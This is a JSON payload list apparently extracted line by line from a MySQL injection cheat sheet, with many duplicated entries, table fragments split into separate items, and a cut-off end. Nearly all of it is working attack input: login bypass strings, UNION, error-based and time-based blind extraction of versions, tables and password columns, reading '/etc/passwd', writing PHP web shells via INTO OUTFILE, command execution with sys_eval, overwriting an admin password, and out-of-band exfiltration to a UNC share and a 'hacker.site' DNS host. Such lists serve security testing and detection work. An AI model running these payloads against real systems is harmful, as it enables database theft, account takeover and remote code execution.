[
  {
    "payload": "    ' False\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    '' True\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    \" False\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    \"\" True\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    ' OR '1\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    ' OR 1 -- -\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    \" OR \"\" = \"\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    \" OR 1 = 1 -- -\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    'LIKE'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    '=0--+\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION SELECT NULL;--\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION SELECT NULL, NULL;-- \n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION SELECT NULL, NULL, NULL;-- \n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| author_id | title                                                           |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT * FROM products WHERE product_name LIKE '%user_input%'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    '+BENCHMARK(3200,SHA1(1))+'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# \n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION ALL SELECT LOAD_FILE('/etc/passwd') --\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT sys_eval('id');\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| sys_eval('id') |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| uid=118(mysql) gid=128(mysql) groups=128(mysql) |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "attacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" --\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "INSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"BCRYPT_HASH\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" -- \", \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\");\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT @@version INTO OUTFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT @@version INTO DUMPFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.hacker.site\\\\a.txt'));\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT LOAD_FILE('\\\\\\\\error\\\\abc');\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT '' INTO DUMPFILE '\\\\\\\\error\\\\abc';\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT '' INTO OUTFILE '\\\\\\\\error\\\\abc';\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "LOAD DATA INFILE '\\\\\\\\error\\\\abc' INTO TABLE DATABASE.TABLE_NAME;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT * FROM mysql.innodb_table_stats;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SHOW TABLES IN dvwa;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Tables_in_dvwa |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| guestbook      |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| users          |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT @@innodb_version;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| @@innodb_version |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 5.6.31           |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT @@version;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| @@version               |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 5.6.31-0ubuntu0.15.10.1 |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT version();\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| version()               |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql> SELECT @@GLOBAL.VERSION;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| @@GLOBAL.VERSION |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| 8.0.27           |\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "%A8%27 OR 1=1;--\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "%bf' OR 1=1 -- --\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    $string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with a backslash\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "    return $string;\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "$id=check_addslashes($_GET['id']);\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "mysql_query(\"SET NAMES gbk\");\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "print_r(mysql_error());\n",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's integrity and security.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Name               | Description              |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "|--------------------|--------------------------|",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| mysql              | Requires root privileges |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| information_schema | Available from version 5 and higher |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Type                       | Description                       |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "|----------------------------|-----------------------------------|",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `#`                        | Hash comment                      |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `/* MYSQL Comment */`      | C-style comment                   |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `/*! MYSQL Special SQL */` | Special SQL                       |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `--`                       | SQL comment                       |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `;%00`                     | Nullbyte                          |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| \\`                         | Backtick                          |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "' False",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "'' True",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "\" False",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "\"\" True",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "' OR '1",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "' OR 1 -- ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "\" OR \"\" = \"",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "\" OR 1 = 1 -- ",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "'LIKE'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "'=0--+",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION SELECT NULL;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION SELECT NULL, NULL;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "UNION SELECT NULL, NULL, NULL;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| ORDER BY        | GROUP BY        | Result |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| --------------- | --------------- | ------ |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Payload                      | Error           |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| ---------------------------- | --------------- |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `1' LIMIT 1,1 INTO @,@--+`  | `The used SELECT statements have a different number of columns` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Method for `MySQL >= 4.1`.",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Payload | Output |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| --- | --- |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `(1)and(SELECT * from db.users)=(1)` | Operand should contain **4** column(s) |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a` | Duplicate column name '**id**' |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a` | Duplicate column name '**name**' |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| author_id | title                                                           |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Name         | Payload         |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| ------------ | --------------- |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1` |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Works with `MySQL >= 4.1",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Works with `MySQL >= 5.1",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "Works with `MySQL >= 5.0",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| Function | Example | Description |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| --- | --- | --- |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `RIGHT` | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `MID` | `MID(version(),1,1)=4` | Extracts a substring from a string (starting at any position) |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "| `LEFT` | `LEFT(version(),1)=4` | Extracts a number of characters from a string (starting from left) |",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
    "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)",
    "category": "sql injection",
    "source_file": "MySQL Injection.md"
  },
  {
